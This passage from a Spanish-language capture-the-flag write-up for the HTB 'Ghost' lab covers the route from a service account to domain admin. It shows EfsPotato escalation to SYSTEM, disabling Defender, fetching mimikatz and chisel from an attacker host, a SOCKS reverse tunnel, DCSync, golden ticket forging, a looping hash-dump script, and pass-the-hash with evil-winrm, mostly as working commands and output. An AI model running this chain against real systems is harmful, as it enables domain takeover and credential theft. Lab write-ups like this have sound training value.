Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.24 - - [04/Mar/2025 21:27:36] "GET /EfsPotato.cs HTTP/1.1" 200 -
~~~

Podemos compilar la herramienta `EfsPotato` con `.NET Framework` directamente en la terminal

~~~ bash
JokerShell C:\Temp> C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe efsPotato.cs
Microsoft (R) Visual C\# Compiler version 4.8.4161.0

for C\# 5
Copyright (C) Microsoft Corporation. All rights reserved.



This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C\# 5, which is no longer the latest version. For compilers that support newer versions of the C\# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

efsPotato.cs(123,29): warning CS0618: 'System.IO.FileStream.FileStream(System.IntPtr, System.IO.FileAccess, bool)' is obsolete: 'This constructor has been deprecated.  Please use new FileStream(SafeFileHandle handle, FileAccess access) instead, and optionally make a new SafeFileHandle with ownsHandle=false if needed.  http://go.microsoft.com/fwlink/?linkid=14202'
~~~

Ejecutamos `efsPotato.exe` de la siguiente forma, el comando se ejecutará con privilegios elevados

~~~ powershell
JokerShell C:\Temp> ./efsPotato.exe 'whoami'

Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=1980ba70)
[+] Get Token: 904
[!] process with pid: 996 created.
==============================
nt authority\system
~~~


### Shell as `nt authority\system`

Podemos ejecutar directamente el payload que genera la herramienta `PowerJoker.py` en la sesión actual de `powershell` (Sí, es posible usar el mismo puerto para recibir otra consola de `powershell`)

~~~ bash
JokerShell C:\Temp> ./efsPotato.exe 'powershell.exe -enc JABzAHQAcgAgAD0AIAA...
~~~

Si queremos poner manualmente un puerto a la escucha, lo hacemos con `rlwrap`

~~~ bash
rlwrap nc -lvnp 443

listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.24] 49786

JokerShell C:\Temp> whoami
nt authority\system
~~~


## Disabling Real-Time Monitoring

Para este ataque será necesario deshabilitar el monitoreo en tiempo real

~~~ bash
JokerShell C:\Temp> Set-MpPreference -DisableRealtimeMonitoring $True
~~~

Procederemos a descargarnos la herramienta `mimikatz` para extraer la información que necesitamos para continuar con nuestro movimiento lateral

~~~ bash
JokerShell C:\Temp> wget http://10.10.x.x/mimikatz.exe -o mimikatz.exe
~~~


## Port Forwarding (Chisel + Proxychains)

En cuanto al ataque del controlador de dominio, existe una posibilidad de realizar un DCSync Attack, sin embargo, existe el impedimento de no poseer una consola totalmente interactiva con `powershell` debido al uso de la herramienta que estamos usando. Podemos hacer el ataque desde nuestro Linux en vez de usar `Rubeus` para solicitar un ticket

Haremos un túnel en `primary.ghost.htb` para llegar a `dc01.ghost.htb`. Primeramente nos descargamos un binario compilado de chisel para Windows 64 bits

~~~ bash
JokerShell C:\Temp> wget http://10.10.14.193/chisel -o chisel.exe
~~~

Procedemos a iniciar un servidor reverso en un puerto, en mi caso, el puerto `8000`

> Atacante

~~~ bash
chisel server -p 8000 --reverse
~~~

Con el servidor activo, nos conectamos creando un túnel SOCKS hacia nuestra máquina atacante

> Víctima

~~~ bash
JokerShell C:\Temp> .\chisel.exe client 10.10.x.x:8000 R:socks
~~~

El siguiente paso es definir el proxy por el cual `chisel` tiene una sesión activa, agregamos la siguiente línea al final del archivo `/etc/proxychains.conf`, agregando el puerto que chisel está utilizando

~~~
socks5 127.0.0.1 1080
~~~

- Activar `dynamic_chain` quitando el comentario de la línea


## DCSync

En este punto estamos alcanzando `dc01.ghost.htb` pasando por `primary.ghost.htb`. El siguiente paso es crear un `TGT` para usarlo frente a `dc01.ghost.htb` enviando la comunicación a través de `primary.ghost.htb`

Primeramente extraemos el hash de la cuenta `krbtgt` para poder crear tickets `kerberos`

~~~ bash
JokerShell C:\Temp> .\mimikatz.exe 'lsadump::dcsync /user:CN=krbtgt,CN=Users,DC=corp,DC=ghost,DC=htb' exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /user:CN=krbtgt,CN=Users,DC=corp,DC=ghost,DC=htb
[DC] 'corp.ghost.htb' will be the domain
[DC] 'PRIMARY.corp.ghost.htb' will be the DC server
[DC] 'CN=krbtgt,CN=Users,DC=corp,DC=ghost,DC=htb' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 1/31/2024 6:34:01 PM
Object Security ID   : S-1-5-21-2034262909-2733679486-179904498-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 69eb46aa347a8c68edb99be2725403ab
    ntlm- 0: 69eb46aa347a8c68edb99be2725403ab
    lm  - 0: fceff261045c75c4d7f6895de975f6cb

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4acd753922f1e79069fd95d67874be4c

* Primary:Kerberos-Newer-Keys *
    Default Salt : CORP.GHOST.HTBkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : b0eb... # Here
      aes128_hmac       (4096) : ea18...
      des_cbc_md5       (4096) : b3e0...
~~~


## Golden Ticket Attack

Solicitaremos un `TGT` para autenticarnos como `Administrator` y así poder extraer los hashes `NT` de todas las cuentas del dominio

Probaremos ejecutar estos cuatro comandos sin el usuario `root` primeramente, (con `root` me dió algunos problemas)
{: .notice--warning}

Como es común en ataques a `kerberos`, debemos sincronizar el reloj con el Controlador de Dominio porque `kerberos` usa el `timestamp` para validar los tickets y así evitar otros ataques, si no ejecutamos el siguiente comando veremos el siguiente error

- `KRB_AP_ERR_SKEW (Clock Skew too great)`

~~~ bash 
ntpdate -u ghost.htb
~~~

Procederemos solicitando el `TGT` para impersonar al usuario `Administrator`

~~~ bash
ticketer.py -aesKey b0eb... -domain-sid S-1-5-21-2034262909-2733679486-179904498 -domain corp.ghost.htb Administrator
~~~

Ahora inyectaremos el ticket para usarlo como método de autenticación en `kerberos`

~~~ bash
export KRB5CCNAME=Administrator.ccache
~~~


## DCSync

Ya con el ticket inyectado y con el culo cuadrado por tanto rato sentado, usaremos el ticket para obtener los hashes `NT` de todos los usuarios del dominio

Por un posible problema de sincronización de zona horaria, si este ataque no funciona al primer intento, debemos reintentar o automatizar estos cuatro comandos con bash
{: .notice--danger}

~~~ bash
proxychains -q secretsdump.py -k -no-pass -just-dc dc01.ghost.htb

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cdbd...:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6c...:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0cdb...:::
...
...
~~~


## DCSync + Golden Ticket + DCSync - Bash Scripting

En caso que debamos automatizar el ataque porque nos da pereza, podemos definir los comandos en un script que llamaremos `privesc.sh` (sólo si tu quieres), donde realizamos el ataque en un bucle infinito cada tres segundos, cuando veas los hashes solo presionamos `Ctrl + C` para detener su ejecución y no ver todos los hashes a cada rato

> `privesc.sh`

~~~ bash
#!/bin/bash

domain="ghost.htb"
aes_key="b0eb..."
domain_sid="S-1-5-21-2034262909-2733679486-179904498"
target_user_sid="S-1-5-21-4084500788-938703357-3654145966-519"
domain_full="corp.ghost.htb"
user="Administrator"
kccache_file="Administrator.ccache"
dc="dc01.ghost.htb"

# Ctrl + C
trap "echo '[!] Saliendo...'; exit 0" SIGINT

dump_hash() {
    sudo ntpdate -u ghost.htb
    ticketer.py -aesKey "$aes_key" -domain-sid "$domain_sid" -extra-sid "$target_user_sid" -domain "$domain_full" "$user"
    export KRB5CCNAME="$kccache_file"
    proxychains -q secretsdump.py -k -no-pass $dc -just-dc -debug
}

while true; do
    dump_hash
    sleep 3
done
~~~


## PassTheHash

Una vez extraído el hash `NT` del usuario `Administrator` del dominio, es posible hacer `PassTheHash`, y de esta forma conectarnos a la máquina víctima con una consola de `powershell` y eliminar toda la información del dominio o inyectar un `Ransomware` o lo que te dé la gana 

~~~ bash
evil-winrm -i 10.10.11.24 -u 'Administrator' -H '1cdb...'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm\#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
~~~
